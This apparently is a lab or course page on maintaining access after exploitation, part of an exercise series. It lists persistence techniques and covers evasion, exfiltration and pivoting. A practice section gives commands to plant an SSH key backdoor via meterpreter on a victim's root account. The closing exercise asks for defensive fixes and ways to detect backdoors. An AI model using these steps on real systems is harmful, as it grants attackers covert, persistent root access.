# Maintaining Access

Post-exploitation, an attacker might want to [persist](https://attack.mitre.org/tactics/TA0003/) their presence in the system, even after the vulnerability gets patched. Common techniques include:

- Account manipulation (e.g., modifying SSH `authorized_keys` for an existing SSH service)
- Creating or modifying a system process (e.g., installing a malicious `systemd` service)
- Scheduled tasks (e.g., abusing `cron` jobs for execution of malicious code)

<details>
  <summary>Realistic issues and workarounds</summary>
  <ul>
    <li>Running multiple commands and inspecting files on the compromised host risks detection.
        <ul>
            <li>Interesting files are usually <a href="https://bashupload.com/">exfilterated</a> for analyzing on the host.
            <li>An attacker may also clear command history and clean other artifacts created during the exploitation.</li>
            </li>
        </ul>
    </li>
    <li>An attacker may not always have root access to install a needed service.
        <ul>
            <li>Existing <a href="https://gtfobins.github.io/">binaries</a> may be abused for privilege escalation.</li>
        </ul>
    </li>
    <li>The victim environment may not have the dependencies required to run the backdoor logic.
        <ul>
            <li><a href="https://github.com/andrew-d/static-binaries">Statically-linked</a> binaries are often grabbed (<code>curl/wget</code>), used, then deleted as needed.</li>
        </ul>
    </li>
    <li>The compromised machine may not be the valuable target, it can be a container/VM, or an entrypoint to an internal network of valuable targets.
        <ul>
            <li>Techniques exist for escaping VMs/Containers.</li>
            <li>An attacker may also use a compromised host as a <a href="https://github.com/haad/proxychains">proxy</a> for the traffic generated by their tools.</li>
        </ul>
    </li>

</ul>
</details>
<br>

## Practice

1. Attacker: create an SSH public key (if needed).

    ```shell
    ssh-keygen -t rsa
    ```

2. Victim (through meterpreter): install a backdoor by adding attacker's public key to the victim's `authorized_keys` file (install an `openssh-server` first if needed).

    ```shell
    upload ~/.ssh/id_rsa.pub /root/.ssh/authorized_keys
    ```

3. Attacker: SSH to the victim's machine without needing an exploit.

    ```shell
    ssh root@vuln
    ```

## Exercise 5

1. Finalize your report with practical recommendations (include commands) to patch the security hole.
2. From the defensive perspective, how could one detect and close backdoors?
